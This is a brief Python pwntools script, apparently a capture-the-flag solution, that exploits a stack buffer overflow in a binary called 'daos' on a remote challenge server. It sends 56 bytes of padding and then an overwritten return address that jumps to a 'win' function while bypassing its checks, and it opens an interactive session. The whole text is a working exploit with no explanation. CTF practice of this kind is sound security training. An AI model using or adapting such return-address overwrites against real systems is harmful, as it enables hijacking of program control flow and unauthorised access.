from pwn import *
context.log_level = 'debug'

elf = context.binary = ELF('./daos')
p = remote("sisterlab.id", 42003)
payload = b'A' * 56
payload += p64(0x00000000004011a6) #win function but jumps over the pesky checks
p.sendlineafter(b'> ', payload) 
p.interactive() 